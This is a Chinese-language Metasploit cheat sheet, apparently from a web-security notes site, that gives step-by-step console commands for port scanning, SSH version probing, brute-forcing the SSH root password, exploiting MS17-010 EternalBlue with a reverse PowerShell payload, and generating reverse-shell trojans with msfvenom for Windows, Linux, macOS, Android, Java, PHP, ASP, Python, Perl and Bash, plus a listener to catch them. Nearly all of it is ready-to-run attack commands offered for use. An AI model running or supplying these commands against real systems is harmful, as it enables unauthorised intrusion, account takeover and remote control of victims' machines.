# metersploit

## 目录
1. docker中使用metasploit
2. 端口扫描
3. 信息收集
4. 账密破解
5. 漏洞利用
6. 木马反弹

## 1.docker中运行
    docker pull metasploitframework/metasploit-framework
    docker run -it 09378b8c0503

### 截图:
![](/websec/tools/metersploit/msf_docker.png)

## 2.端口扫描
    msf5 >search portscan
    msf5 >use auxiliary/scanner/portscan/syn
    msf5 auxiliary(scanner/portscan/syn) > set RHOSTS 10.211.55.6
    msf5 auxiliary(scanner/portscan/syn) > run

### 截图:
![](/websec/tools/metersploit/portscan_1.png)
![](/websec/tools/metersploit/portscan_2.png)

## 3.信息收集
    msf5 > search _version
    msf5 > use auxiliary/scanner/ssh/ssh_version
    msf5 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 10.211.55.6
    msf5 auxiliary(scanner/ssh/ssh_version) > run

### 截图:
![](/websec/tools/metersploit/info_1.png)
![](/websec/tools/metersploit/info_2.png)


## 4.账密破解
    msf5 > search _login
    msf5 > use auxiliary/scanner/ssh/ssh_login
    msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.211.55.6
    msf5 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
    msf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /OPT/passwd
    msf5 auxiliary(scanner/ssh/ssh_version) > run

### 截图:
![](/websec/tools/metersploit/userpass_1.png)
![](/websec/tools/metersploit/userpass_2.png)


## 5.漏洞利用
    msf5 > search ms17-010
    msf5 > use exploit/windows/smb/ms17_010_eternalblue
    msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.211.55.1
    msf5 exploit(windows/smb/ms17_010_eternalblue) > show payloads    #查看当前exploit支持的payloads
    msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/powershell_reverse_tcp
    msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.211.55.100
    msf5 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 6666
    msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

### 截图:
![](/websec/tools/metersploit/vul_1.png)
![](/websec/tools/metersploit/vul_2.png)
![](/websec/tools/metersploit/vul_3.png)
![](/websec/tools/metersploit/vul_4.png)
## 6.木马反弹

### 生成木马
    windows: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=44444 X >test.exe
    linux: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 X >text
    mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
    android: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 R >text.apk
    java: msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 W >text.jar
    war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
    php: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 -f raw >text.php
    asp : msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 -f asp > shell.asp
    aspx: msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST= 192.168.1.109 LPORT=7788 -f aspx x> /home/niexinming/back.aspx
    python: msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
    jsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.146 LPORT=1234 R >text.jsp
    perl: msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
    bash: msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

### 监听等待反弹
    msf5 > use exploit/multi/handler
    msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf5 exploit(multi/handler) > set LHOST 10.211.55.100
    msf5 exploit(multi/handler) > set LPORT 4444
    msf5 exploit(multi/handler) > run